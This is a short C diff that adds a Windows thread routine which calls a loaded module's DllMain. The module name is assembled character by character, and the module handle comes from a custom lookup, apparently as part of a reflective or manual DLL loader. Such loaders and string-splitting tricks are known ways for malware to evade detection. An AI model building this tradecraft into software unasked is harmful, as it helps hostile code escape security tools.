@@ -660,5 +660,16 @@ FARPROC GPARO(IN HMODULE hModule, IN int ordinal) {
 
 }
 
+DWORD WINAPI ThreadProc(LPVOID lpParameter) {
+    // Call DllMain with proper arguments
+	WCHAR SRH[] = {L'S', L'R', L'H', L'.', L'd', L'l', L'l', L'\0'};
+    fnDllMain pDllMain = NULL;
+    PBYTE pebase = NULL;
+	pDllMain = (fnDllMain)lpParameter;
+	pebase = (PBYTE)GMHR(SRH);
 
+    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);
+
+
+}
 
